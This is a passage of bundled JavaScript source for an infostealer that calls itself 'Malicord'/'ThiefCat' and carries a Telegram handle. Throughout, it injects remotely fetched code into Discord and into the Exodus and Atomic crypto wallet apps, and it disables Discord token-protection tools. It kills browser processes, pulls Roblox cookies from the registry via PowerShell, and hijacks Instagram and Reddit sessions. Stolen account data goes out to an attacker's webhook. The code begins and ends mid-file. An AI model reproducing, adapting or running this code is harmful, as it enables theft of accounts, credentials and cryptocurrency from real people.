injection = response.data;\n          const regex = /%[A-Z]{7}%/gm;\n          replacedInjection = injection.replace(regex, lkn);\n          replacedInjection = replacedInjection.replace(\n            /%TRANSFER_URL%/g,\n            link\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%DISABLEFA%/g,\n            a2f\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%AUTOMAILCHANGER%/g,\n            automailchanger\n          );\n          replacedInjection = await replacedInjection.replace(\n            /%CLIENTEMAIL%/g,\n            ClientEmail\n          );\n          const indexFile = path.join(\n            `${desktop}/discord_desktop_core/index.js`\n          );\n          await fs.writeFileSync(indexFile, `${replacedInjection}`, \"utf-8\");\n          const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];\n          if (!fs.existsSync(firstDirectory + \"/ThiefCat\")) {\n            await fs.mkdirSync(firstDirectory + \"/ThiefCat\");\n          }\n          setTimeout(async () => {\n            try {\n              if (desktop) {\n                const discordFolder = path.join(desktop, \"..\", \"..\", \"..\");\n                const buildBatPath = path.join(\n                  desktop,\n                  \"..\",\n                  \"..\",\n                  path.basename(discordFolder) + \".exe\"\n                );\n                const options = {\n                  cwd: path.join(desktop, \"..\", \"..\"),\n                  stdio: \"inherit\",\n                };\n\n                spawn(buildBatPath, [], options);\n              }\n            } catch (e) {}\n          }, 12000);\n        } catch (err) {\n          save.SaveError(err);\n        }\n      }\n    } catch (e) {\n      save.SaveError(e);\n    }\n  } else if (apiurl.includes(\"https://hawkish.eu/grabber/hooks/\")) {\n    lkn = apiurl;\n\n    try {\n      const filteredProcesses = await core.filterProcessesByName(\"discord\");\n      if (filteredProcesses.length > 0) {\n        try {\n          filteredProcesses.forEach((proc) => {\n            process.kill(proc.pid);\n          });\n        } catch (e) {}\n      }\n      const local = process.env.localappdata;\n      const discordFolders = await glob.sync(`${local}/*cord*`);\n      var desktops = [];\n\n      for (let i = 0; i < discordFolders.length; i++) {\n        const discordFolder = discordFolders[i];\n        const apps = glob.sync(`${discordFolder}/app-*/modules/`);\n        await inject_antidelete(\n          apps,\n          inject,\n          webhook,\n          apiurl,\n          url,\n          link,\n          a2f,\n          automailchanger,\n          ClientEmail\n        );\n        for (let u = 0; u < apps.length; u++) {\n          const app = apps[u];\n          const desktopCores = await glob.sync(`${app}/discord_desktop_core-*`);\n          desktops.push(...desktopCores);\n        }\n      }\n\n      for (let i = 0; i < desktops.length; i++) {\n        const desktop = desktops[i];\n        try {\n          const response = await axios.get(url);\n          const injection = response.data;\n\n          const regex = /%[A-Z]{3}_[A-Z]{3}%/gm;\n          replacedInjection = await injection.replace(regex, lkn);\n          replacedInjection = await replacedInjection.replace(\n            /%TRANSFER_URL%/g,\n            link\n          );\n          replacedInjection = await replacedInjection.replace(\n            /\"%DISABLE_FA%\"/g,\n            a2f\n          );\n          const indexFile = path.join(\n            `${desktop}/discord_desktop_core/index.js`\n          );\n          await fs.writeFileSync(indexFile, `${replacedInjection}`, \"utf-8\");\n          const firstDirectory = glob.sync(`${desktop}/discord_d*`)[0];\n          await fs.mkdirSync(firstDirectory + \"/ThiefCat\", (err) => {\n            if (err) {\n            }\n          });\n          try {\n            if (desktop) {\n              exec(\n                `start ${`${path.join(desktop, \"..\", \"..\", \"Discord.exe\")}`}`\n              );\n            }\n          } catch (e) {}\n        } catch (err) {\n          save.SaveError(err);\n        }\n      }\n    } catch (e) {\n      save.SaveError(e);\n    }\n  }\n}\n\nconst replace = (buf, a, b) => {\n  if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);\n  const idx = buf.indexOf(a);\n  if (idx === -1) return buf;\n  if (!Buffer.isBuffer(b)) b = Buffer.from(b);\n\n  const before = buf.slice(0, idx);\n  const after = replace(buf.slice(idx + a.length), a, b);\n  const len = idx + b.length + after.length;\n  return Buffer.concat([before, b, after], len);\n};\n\nasync function BypassDiscordTokenProtector(inject) {\n  if (inject != \"yes\") return;\n  try {\n    const tp = path.join(process.env.APPDATA, \"DiscordTokenProtector\");\n    const config = path.join(tp, \"config.json\");\n\n    if (\n      !fs.existsSync(tp) ||\n      !fs.lstatSync(tp).isDirectory() ||\n      !fs.existsSync(config)\n    ) {\n      return;\n    }\n    const filesToRemove = [\n      \"DiscordTokenProtector.exe\",\n      \"ProtectionPayload.dll\",\n      \"secure.dat\",\n    ];\n    for (const file of filesToRemove) {\n      const filePath = path.join(tp, file);\n      if (fs.existsSync(filePath)) {\n        fs.unlinkSync(filePath);\n      }\n    }\n    let item;\n    try {\n      const fileContent = fs.readFileSync(config, \"utf-8\");\n      item = JSON.parse(fileContent);\n    } catch (error) {\n      return;\n    }\n    item[`KSCHdsc_is_here`] = \"https://t.me/Sordeal\";\n    item.auto_start = false;\n    item.auto_start_discord = false;\n    item.integrity = false;\n    item.integrity_allowbetterdiscord = false;\n    item.integrity_checkexecutable = false;\n    item.integrity_checkhash = false;\n    item.integrity_checkmodule = false;\n    item.integrity_checkscripts = false;\n    item.integrity_checkresource = false;\n    item.integrity_redownloadhashes = false;\n    item.iterations_iv = 364;\n    item.iterations_key = 457;\n    item.version = 69420;\n\n    fs.writeFileSync(config, JSON.stringify(item, null, 2));\n    fs.appendFileSync(config, `\\n\\n//KSCHdsc_is_here | https://t.me/Sordeal`);\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function pwnBetterDiscord(inject) {\n  if (inject != \"yes\") return;\n  try {\n    let dir = process.env.appdata + \"/BetterDiscord/data/betterdiscord.asar\";\n    if (fs.existsSync(dir)) {\n      const boom = fs.readFileSync(dir);\n      fs.writeFileSync(dir, replace(boom, \"api/webhooks\", \"KSCHdsc\"));\n    }\n\n    return;\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function exodusInjection(cc, webhook, injectionurl) {\n  if (cc !== \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    let local = process.env.localappdata;\n    const response = await axios.get(injectionurl);\n    const injection = await response.data;\n    let injectionpath = glob.sync(`${local}/exodus/app-*/resources/app.asar`);\n    let output = path.join(injectionpath[0], \"..\", \"unpacked\");\n    if (injectionpath.length > 0) {\n      await unpackAsar(injectionpath[0], output);\n      let g = glob.sync(`${output}/src/app/main/index.js`);\n      await fs.writeFileSync(g[0], `${injection}`, \"utf-8\");\n\n      await packAsar(output, path.join(injectionpath[0]));\n      let json = {\n        webhook,\n        link: stat.exodusurl[0] ?? \"none\",\n      };\n\n      const parentDir = path.join(injectionpath[0], \"..\", \"..\");\n      fs.writeFileSync(\n        path.join(parentDir, \"config.json\"),\n        JSON.stringify(json)\n      );\n    }\n  } catch (e) {}\n}\n\nfunction unpackAsar(asarFilePath, outputDir) {\n  try {\n    asar.extractAll(asarFilePath, outputDir);\n  } catch (err) {}\n}\n\nasync function packAsar(inputDir, outputFilePath) {\n  try {\n    await asar.createPackage(inputDir, outputFilePath);\n    if (fs.existsSync(outputFilePath)) {\n      if (fs.existsSync(inputDir)) {\n        fs.rmSync(inputDir, { recursive: true });\n      }\n    } else {\n    }\n  } catch (err) {}\n}\n\nasync function AtomicInjection(cc, webhook, injectionurl, mainAtomic) {\n  if (cc != \"yes\" || webhook === \"%WEBHOOK%\" || !injectionurl) return;\n  try {\n    const local = process.env.localappdata;\n    const response = await axios.get(injectionurl);\n    const injection = await response.data;\n    const resp = await axios.get(mainAtomic);\n    const AtmcMain = await resp.data;\n    let injectionpath = glob.sync(\n      `${local}/Programs/atomic/resources/app.asar`\n    );\n\n    if (injectionpath[0]) {\n      let output = path.join(injectionpath[0], \"..\", \"unpacked\");\n      await unpackAsar(injectionpath[0], output);\n      let g = `${output}/dist/electron/vendors.3d9f29748fbff1778bdc.js`;\n      await fs.writeFileSync(g, `${injection}`, \"utf-8\");\n      let main = `${output}/dist/electron/main.js`;\n      await fs.writeFileSync(main, `${AtmcMain}`, \"utf-8\");\n\n      await packAsar(output, path.join(injectionpath[0]));\n      console.log(stat.atomicurl[0])\n      let json = {\n        webhook,\n        link: stat.atomicurl[0] ?? \"none\",\n      };\n\n      const parentDir = path.join(injectionpath[0], \"..\", \"..\");\n\n      fs.writeFileSync(\n        path.join(parentDir, \"config.json\"),\n        JSON.stringify(json)\n      );\n    }\n  } catch (e) {console.log(e)}\n}\n\nmodule.exports = {\n  inject,\n  pwnBetterDiscord,\n  BypassDiscordTokenProtector,\n  exodusInjection,\n  AtomicInjection,\n  chrome_injection,\n};\n\n\n//# sourceURL=webpack://script/./utils/injection.js?");

/***/ }),

/***/ "./utils/instagram.js":
/*!****************************!*\
  !*** ./utils/instagram.js ***!
  \****************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\"),\r\n  path = __webpack_require__(/*! path */ \"path\");\r\n\r\nasync function ParseInstagram(cc) {\r\n  if (cc !== \"yes\") return;\r\n  const basepath = stat.testpath[0];\r\n  const socialDir = path.join(basepath, \"Social\");\r\n  const InstaDir = path.join(socialDir, \"Instagram\");\r\n  let g = [];\r\n  \r\n  let instagram_sessions = stat.InstaSessId;\r\n  if (instagram_sessions && instagram_sessions.length) {\r\n    for (const instagram of instagram_sessions) {\r\n      const profile = await axios\r\n        .get(\r\n          \"https://i.instagram.com/api/v1/accounts/current_user/?edit=true\",\r\n          {\r\n            headers: {\r\n              \"user-agent\": \"Instagram 219.0.0.12.117 Android\",\r\n              cookie: `sessionid=${instagram}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data.user)\r\n        .catch(() => {});\r\n      let {\r\n        full_name,\r\n        is_private,\r\n        email,\r\n        phone_number,\r\n        profile_pic_url,\r\n        username,\r\n      } = profile;\r\n      if (!profile) continue;\r\n      try {\r\n        if (!fs.existsSync(socialDir)) {\r\n          fs.mkdirSync(socialDir);\r\n        }\r\n        if (!fs.existsSync(InstaDir)) {\r\n          fs.mkdirSync(InstaDir);\r\n        }\r\n      } catch (e) {}\r\n      let fdp = `Account: ${full_name}\r\nPrivate?: ${is_private}\r\nemail: ${email}\r\nphone_number: ${phone_number}\r\nprofile_pic_url: ${profile_pic_url}`\r\n      try {\r\n        const instarFilePath = path.join(InstaDir, \"Instagram.txt\");\r\n        fs.writeFileSync(instarFilePath, fdp);\r\n      } catch (e) {}\r\n      const profile2 = await axios\r\n        .get(`https://i.instagram.com/api/v1/users/${profile.pk_id}/info`, {\r\n          headers: {\r\n            \"user-agent\": \"Instagram 219.0.0.12.117 Android\",\r\n            cookie: `sessionid=${instagram}`,\r\n          },\r\n        })\r\n        .then((res) => res.data.user)\r\n        .catch(() => {});\r\n      let { is_verified, follower_count } = profile2;\r\n\r\n      let embed = {\r\n        title: \"Instagram Session\",\r\n        fields: [\r\n          {\r\n            name: `${embeds.instagram} Username:`,\r\n            value: `[\\`${full_name}\\`](https://instagram.com/${username})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.twitter_followers} Followers:`,\r\n            value: `\\`${follower_count ?? \"0\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email ?? \"none\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.instaiscert} Certified`,\r\n            value: `\\`${is_verified ? embeds.instagram_certified : \"\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.phone} Phone Number`,\r\n            value: `\\`${phone_number ? phone_number : \"\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.token} Token`,\r\n            value: `\\`\\`\\`${instagram}\\`\\`\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        thumbnail: {\r\n          url: profile_pic_url,\r\n        },\r\n        footer: {\r\n          text: \"@Malicord | https://t.me/Sordeal\",\r\n        },\r\n        color: 10038562,\r\n      };\r\n      g.push(embed);\r\n    }\r\n    \r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n      username: \"Malicord\",\r\n      embeds: g,\r\n    };\r\n    \r\n    return tosend;\r\n  }\r\n}\r\nmodule.exports = {\r\n  ParseInstagram,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/instagram.js?");

/***/ }),

/***/ "./utils/kill.js":
/*!***********************!*\
  !*** ./utils/kill.js ***!
  \***********************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const process = __webpack_require__(/*! process */ \"process\"),\r\ncore = __webpack_require__(/*! ./core */ \"./utils/core.js\");\r\n\r\nasync function KillBrowsersProcess(inject, browsers) {\r\n    let allproc;\r\n    if (inject == \"yes\" && browsers == \"yes\"){\r\n        allproc = \r\n        [\r\n            \"firefox\",\r\n            \"chrome\",\r\n            \"mozilla\",\r\n            \"vivaldi\",\r\n            \"Opera\",\r\n            \"OperaGX\",\r\n            \"EpicPrivacy\",\r\n            \"ChromeSxS\",\r\n            \"Sputnik\",\r\n            \"7Star\",\r\n            \"CentBrowser\",\r\n            \"Orbitum\",\r\n            \"Amigo\",\r\n            \"Torch\",\r\n            \"Kometa\",\r\n            \"discord\",\r\n            \"cord\",\r\n            \"steam\",\r\n            \"filezilla\",\r\n            \"brave\",\r\n            \"msedge\",\r\n            \"edge\",\r\n        ]\r\n    } else if(inject != \"yes\" && browsers == \"yes\"){ \r\n\r\n        allproc = [\r\n        \"firefox\",\r\n        \"chrome\",\r\n        \"mozilla\",\r\n        \"vivaldi\",\r\n        \"Opera\",\r\n        \"OperaGX\",\r\n        \"EpicPrivacy\",\r\n        \"ChromeSxS\",\r\n        \"Sputnik\",\r\n        \"7Star\",\r\n        \"CentBrowser\",\r\n        \"Orbitum\",\r\n        \"Amigo\",\r\n        \"Torch\",\r\n        \"Kometa\",\r\n        \"steam\",\r\n        \"filezilla\",\r\n        \"edge\",\r\n    ]\r\n    }else if(inject == \"yes\" && browsers != \"yes\"){  \r\n        allproc = [\r\n        \"discord\",\r\n        \"cord\",\r\n    ]\r\n    }\r\n    try {\r\n        allproc.forEach(async g => {\r\n            const filteredProcesses = await core.filterProcessesByName(g);\r\n            if (filteredProcesses.length > 0) {\r\n                try {\r\n                    filteredProcesses.forEach((proc) => {\r\n                        process.kill(proc.pid);\r\n                    });\r\n                } catch (e) { }\r\n            }\r\n        })\r\n    } catch (e) { }\r\n}\r\n\r\n\r\nmodule.exports = {\r\n    KillBrowsersProcess\r\n}\n\n//# sourceURL=webpack://script/./utils/kill.js?");

/***/ }),

/***/ "./utils/minecraft.js":
/*!****************************!*\
  !*** ./utils/minecraft.js ***!
  \****************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const axios = __webpack_require__(/*! axios */ \"axios\"),\r\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\nhttps = __webpack_require__(/*! https */ \"https\"),\r\nagent = new https.Agent({ rejectUnauthorized: false }),\r\nfs = __webpack_require__(/*! fs */ \"fs\"),\r\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nasync function Malicordfinduid(wb, cc) {\r\n  if(cc != \"yes\")return;\r\n  for (const m of stat.minecraft_account) {\r\n\r\n    try {\r\n      let name = [];\r\n      let count = 0;\r\n      const content = fs.readFileSync(m, \"utf-8\");\r\n      const jsonData = JSON.parse(content);\r\n      if (jsonData) {\r\n        if(!jsonData.accounts)return;\r\n        console.log(jsonData.accounts)\r\n        const accountInfo =jsonData.accounts ;\r\n        for (const accountId in accountInfo) {\r\n          const emailRegex = /[\\w\\.-]+@[a-zA-Z\\d\\.-]+\\.[a-zA-Z]{2,}/g;\r\n          const emails = JSON.stringify(accountInfo).match(emailRegex) ?? \"none\";\r\n          const profile = accountInfo[accountId].minecraftProfile;\r\n          if (profile) {\r\n            const playerDBResponse = await axios.get(\r\n              `https://api.namemc.com/profile/${profile.id}/friends`\r\n            );\r\n            if (\r\n              playerDBResponse.status === 200 &&\r\n              playerDBResponse.data.length > 0\r\n            ) {\r\n              name = playerDBResponse.data.map((entry) => entry.name);\r\n              count = name.length;\r\n            }\r\n            const tosend = {\r\n              username: \"Malicord\",\r\n              avatar_url:\r\n                \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n              embeds: [\r\n                {\r\n                  title: \"Minecraft Account\",\r\n                  thumbnail: {\r\n                    url: `https://crafatar.com/renders/head/${profile.id}.png`,\r\n                  },\r\n                  color: 10038562,\r\n                  description: `[Download Skin](https://crafatar.com/skins/${profile.id}.png)\\n[Download Capes](http://s.optifine.net/capes/${profile.name}.png)`,\r\n                  fields: [\r\n                    {\r\n                      name: `${embeds.mcid} Account ID:`,\r\n                      value: `\\`\\`\\`${accountId}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.mcgapple} Username:`,\r\n                      value: `\\`\\`\\`${profile.name}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.mcmail} Email Found:`,\r\n                      value: `\\`\\`\\`${emails || `None`}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.keysmc} Minecraft UID`,\r\n                      value: `\\`\\`\\`${profile.id}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.namemc} Friends Count`,\r\n                      value: `\\`\\`\\`${count || 0}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                    {\r\n                      name: `${embeds.namemc} Friends List:`,\r\n                      value: `\\`\\`\\`${name.join(\", \") || `None`}\\`\\`\\``,\r\n                      inline: true,\r\n                    },\r\n                  ],\r\n                  footer: {\r\n                    text: `@Malicord | https://t.me/Sordeal`,\r\n                  },\r\n                },\r\n              ],\r\n            };\r\n            try {\r\n              await axios({\r\n                url: wb,\r\n                method: \"POST\",\r\n                headers: {\r\n                  \"Content-Type\": \"application/json\",\r\n                },\r\n                httpsAgent: agent,\r\n                data: tosend,\r\n              });\r\n            } catch (e) {}\r\n          }\r\n        }\r\n      }\r\n    } catch (error) {}\r\n  }\r\n}\r\n\r\nmodule.exports = {\r\n  Malicordfinduid,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/minecraft.js?");

/***/ }),

/***/ "./utils/reddit.js":
/*!*************************!*\
  !*** ./utils/reddit.js ***!
  \*************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\"),\r\n  path = __webpack_require__(/*! path */ \"path\");\r\n\r\nasync function ParseReddit(cc) {\r\n  if (cc !== \"yes\") return;\r\n\r\n  const basepath = stat.testpath[0];\r\n  const socialDir = path.join(basepath, \"Social\");\r\n  const RedditDir = path.join(socialDir, \"Reddit\");\r\n  let g = [];\r\n  let reddit_sessions = stat.RedditSess;\r\n  if (reddit_sessions && reddit_sessions.length) {\r\n    for (const reddit of reddit_sessions) {\r\n      const { data: bearer } = await axios.post(\r\n        \"https://accounts.reddit.com/api/access_token\",\r\n        { scopes: [\"*\", \"email\", \"pii\"] },\r\n        {\r\n          headers: {\r\n            Cookie: `reddit_session=${reddit}`,\r\n            Authorization: \"Basic b2hYcG9xclpZdWIxa2c6\",\r\n          },\r\n        }\r\n      );\r\n      const { data: account } = await axios.get(\r\n        \"https://oauth.reddit.com/api/v1/me\",\r\n        {\r\n          headers: { Authorization: `Bearer ${bearer.access_token}` },\r\n        }\r\n      );\r\n      let { total_karma, icon_img, is_gold, email, name } = account;\r\n\r\n      let fdp = `Account: ${name}\r\nPrivate?: ${is_private}\r\nis_gold: ${is_gold}\r\ntotal_karma: ${total_karma}\r\nicon_img: ${icon_img}`\r\n      try {\r\n        if (!fs.existsSync(socialDir)) {\r\n          fs.mkdirSync(socialDir);\r\n        }\r\n        if (!fs.existsSync(RedditDir)) {\r\n          fs.mkdirSync(RedditDir);\r\n        }\r\n      } catch (e) {}\r\n      try {\r\n        const instarFilePath = path.join(RedditDir, \"Reddit.txt\");\r\n        fs.writeFileSync(instarFilePath, fdp);\r\n      } catch (e) {}\r\n      let profile_link = `https://www.reddit.com/user/${name}`;\r\n      let embed = {\r\n        color: 10038562,\r\n        thumbnail: {\r\n          url: icon_img,\r\n        },\r\n        fields: [\r\n          {\r\n            name: `${embeds.billings} Profile`,\r\n            value: `[\\`${name}\\`](${profile_link})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.karma} Karma`,\r\n            value: `\\`${total_karma}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.gold} Gold`,\r\n            value: `\\`${is_gold}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email}\\``,\r\n            inline: true,\r\n          },\r\n        ],\r\n        footer: {\r\n          text: \"@Malicord | https://t.me/Sordeal\",\r\n        },\r\n        title: \"Reddit Session\",\r\n      };\r\n      g.push(embed);\r\n    }\r\n\r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n      username: \"Malicord\",\r\n      embeds: g,\r\n    };\r\n    return tosend;\r\n  }\r\n}\r\n\r\nmodule.exports = { ParseReddit };\r\n\n\n//# sourceURL=webpack://script/./utils/reddit.js?");

/***/ }),

/***/ "./utils/roblox.js":
/*!*************************!*\
  !*** ./utils/roblox.js ***!
  \*************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { execSync } = __webpack_require__(/*! child_process */ \"child_process\"),\r\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\naxios = __webpack_require__(/*! axios */ \"axios\"),\r\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\r\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nfunction MalicordGetRoblox(Found_Roblox) {\r\n  if (Found_Roblox != \"yes\") return;\r\n  try {\r\n    function subproc(path) {\r\n      try {\r\n        const cmd = `powershell Get-ItemPropertyValue -Path ${path}:SOFTWARE\\\\Roblox\\\\RobloxStudioBrowser\\\\roblox.com -Name .ROBLOSECURITY`;\r\n        const options = { windowsHide: true, shell: true };\r\n\r\n        return execSync(cmd, options).toString().trim();\r\n      } catch (e) {\r\n        return null;\r\n      }\r\n    }\r\n\r\n    const regex_c00ks = subproc(\"HKLM\") || subproc(\"HKCU\");\r\n    if (regex_c00ks) {\r\n      regex_c00ks.push(regex_c00ks);\r\n    }\r\n    if (regex_c00ks.length > 0) {\r\n      if (regex_c00ks.includes(\".ROBLOSECURITY\")) {\r\n        stat.AddRoblox(regex_c00ks);\r\n      }\r\n    }\r\n  } catch (e) {\r\n    save.SaveError(e);\r\n  }\r\n}\r\n\r\nasync function ParseAndSendRoblox(cc) {\r\n  if (cc !== \"yes\") return;\r\n\r\n  const processedUsernames = new Set();\r\n  const axiosConfig = {\r\n    maxRedirects: 0,\r\n    validateStatus: function (status) {\r\n      return (status >= 200 && status < 300) || status === 302;\r\n    },\r\n  };\r\n\r\n  try {\r\n    const requests = stat.roblox_cookies.map(async (cookies) => {\r\n      save.saveRoblox(cookies)\r\n      const [userInfoResponse, friendsCountResponse] = await Promise.all([\r\n        axios.get(\"https://www.roblox.com/mobileapi/userinfo\", {\r\n          headers: {\r\n            Cookie: `.ROBLOSECURITY=${cookies}`,\r\n          },\r\n          ...axiosConfig,\r\n        }),\r\n        axios.get(\"https://friends.roblox.com/v1/my/friends/count\", {\r\n          headers: {\r\n            Cookie: `.ROBLOSECURITY=${cookies}`,\r\n          },\r\n          ...axiosConfig,\r\n        }),\r\n      ]);\r\n\r\n      if (\r\n        userInfoResponse.status === 200 &&\r\n        friendsCountResponse.status === 200\r\n      ) {\r\n        const {\r\n          UserName,\r\n          RobuxBalance,\r\n          ThumbnailUrl,\r\n          IsAnyBuildersClubMember,\r\n          IsPremium,\r\n        } = userInfoResponse.data;\r\n        const { count } = friendsCountResponse.data;\r\n        if (!processedUsernames.has(UserName)) {\r\n          processedUsernames.add(UserName);\r\n\r\n          const parsed = {\r\n            UserName,\r\n            RobuxBalance,\r\n            ThumbnailUrl,\r\n            IsAnyBuildersClubMember,\r\n            IsPremium,\r\n            friendscount: count,\r\n            cookies,\r\n          };\r\n\r\n          stat.detailRoblox(parsed);\r\n        }\r\n      }\r\n    });\r\n\r\n    await Promise.all(requests);\r\n  } catch (error) {}\r\n}\r\n\r\nasync function sendRoblox(cc) {\r\n  if (cc != \"yes\") return;\r\n  let p = stat.roblox_account;\r\n  if (p.length < 1) return;\r\n  return p;\r\n}\r\n\r\nfunction compile(embeds) {\r\n  var build = \"\";\r\n  build += `{\\n\"content\": null,\\n\"embeds\": [`;\r\n  for (let i = 0; i < embeds.length; i++) {\r\n    build += embeds[i];\r\n    if (i != embeds.length - 1) {\r\n      build += \",\\n\";\r\n    }\r\n  }\r\n  build += `],\\n\"avatar_url\": \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\\n\"username\": \"Malicord\",\\n\"attachments\": []\\n}`;\r\n  return build;\r\n}\r\n\r\nasync function embed(\r\n  UserName,\r\n  RobuxBalance,\r\n  ThumbnailUrl,\r\n  IsAnyBuildersClubMember,\r\n  IsPremium,\r\n  friendscount,\r\n  cookies\r\n) {\r\n  let embed = {\r\n    fields: [\r\n      {\r\n        name: `${embeds.atom} Name:`,\r\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${UserName}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\r\n        inline: false,\r\n      },\r\n      {\r\n        name: `${embeds.dsc} Robux:`,\r\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${RobuxBalance}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\r\n        inline: true,\r\n      },\r\n      {\r\n        name: `${embeds.rblxinfo} premium:`,\r\n        value: `\\`${IsPremium ? \"\" : \"\"}\\``,\r\n        inline: !0,\r\n      },\r\n      {\r\n        name: `${embeds.infoyl} Club Member:`,\r\n        value: `\\`${IsAnyBuildersClubMember ? \"\" : \"\"}\\``,\r\n        inline: !0,\r\n      },\r\n      {\r\n        name: `${embeds.inject} Cookie:`,\r\n        value: `[Cookies](${cookies})`,\r\n        inline: true,\r\n      },\r\n    ],\r\n    description: `\\`${friendscount} Friends\\``,\r\n    color: 10038562,\r\n    footer: {\r\n      text: \"@Malicord | https://t.me/Sordeal\",\r\n    },\r\n    title: \"Roblox Account\",\r\n    thumbnail: {\r\n      url: `${ThumbnailUrl}`,\r\n    },\r\n  };\r\n  return JSON.stringify(embed);\r\n}\r\n\r\nmodule.exports = {\r\n  MalicordGetRoblox,\r\n  ParseAndSendRoblox,\r\n  sendRoblox,\r\n  embed,\r\n  compile,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/roblox.js?");

/***/ }),

/***/ "./utils/save.js":
/*!***********************!*\
  !*** ./utils/save.js ***!
  \***********************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  fs = __webpack_require__(/*! fs */ \"fs\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  archiver = __webpack_require__(/*! archiver */ \"archiver\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\");\n\nasync function getbasepath() {\n  const { ip, hostname, city, region, country, loc, org, postal, timezone } =\n    await core.getPublicIp();\n  try {\n    return (\n      process.env.localappdata + \"\\\\\" + \"Temp\" + \"\\\\\" + `${core.generateId(20)}`\n    );\n  } catch (err) {\n    if (err) {\n      return (\n        process.env.localappdata +\n        \"\\\\\" +\n        \"Temp\" +\n        \"\\\\\" +\n        `KS_MALICORD_${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}`\n      );\n    }\n  }\n}\nasync function getsavepath() {\n  const { ip, hostname, city, region, country, loc, org, postal, timezone } =\n    await core.getPublicIp();\n  try {\n    return (\n      process.env.localappdata +\n      \"\\\\\" +\n      \"Temp\" +\n      \"\\\\\" +\n      `${country.toUpperCase()}_MALICORD_${\n        process.env.USERNAME.replace(\".\", \"\") || \"USER\"\n      }` +\n      \".zip\"\n    );\n  } catch (err) {\n    if (err) {\n      return (\n        process.env.localappdata +\n        \"\\\\\" +\n        \"Temp\" +\n        \"\\\\\" +\n        `KS_MALICORD_${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}` +\n        \".zip\"\n      );\n    }\n  }\n}\n\nasync function Init() {\n  const basepath = await getbasepath();\n  const savepath = await getsavepath();\n  try {\n    if (fs.existsSync(basepath)) {\n      await fs.rmSync(basepath, { recursive: true });\n    }\n    if (fs.existsSync(savepath)) {\n      await fs.rmSync(savepath, { recursive: true });\n    }\n  } catch (e) {}\n\n  await fs.mkdirSync(basepath);\n  stat.addbasepath(basepath);\n  stat.addsavepath(savepath);\n}\n\nasync function Save(copypath, mainfolder, subfolder) {\n  let basepath = stat.testpath[0];\n\n  const files = core.recursiveRead(copypath, copypath, \"\");\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const savePath =\n      basepath +\n      \"\\\\\" +\n      mainfolder +\n      \"\\\\\" +\n      subfolder +\n      \"\\\\\" +\n      file.replace(copypath, \"\");\n    try {\n      createAllDir(savePath);\n      fs.writeFileSync(savePath, 